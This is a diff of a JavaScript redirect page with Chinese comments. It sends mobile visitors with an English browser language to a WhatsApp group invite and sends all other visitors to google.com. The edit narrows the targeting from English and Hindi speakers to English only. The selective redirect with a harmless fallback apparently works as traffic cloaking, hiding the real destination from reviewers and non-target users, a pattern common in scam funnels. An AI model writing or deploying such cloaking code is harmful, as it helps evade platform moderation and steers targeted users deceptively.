@@ -12,20 +12,19 @@
                 return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
             }
 
-            // 2. 检测浏览器语言是否为 英文 或 印地语
-            function isEnglishOrHindi() {
+            // 2. 检测浏览器语言是否为英文
+            function isEnglish() {
                 var lang = navigator.language || navigator.userLanguage;
-                if (!lang) return false;
-                var prefix = lang.substr(0, 2).toLowerCase();
-                return prefix === 'en' || prefix === 'hi';
+                // 取前两位，判断是否为 'en'
+                return lang && lang.substr(0, 2).toLowerCase() === 'en';
             }
 
             // 定义跳转目标
             var targetUrl = "https://chat.whatsapp.com/LgCeE6Coc4N5A7auiPTsH4";
             var fallbackUrl = "https://www.google.com";
 
-            // 执行条件判断：手机端 且 (英文 或 印地语)
-            if (isMobile() && isEnglishOrHindi()) {
+            // 执行条件判断：手机端 且 浏览器语言为英文
+            if (isMobile() && isEnglish()) {
                 window.location.replace(targetUrl);
             } else {
                 window.location.replace(fallbackUrl);
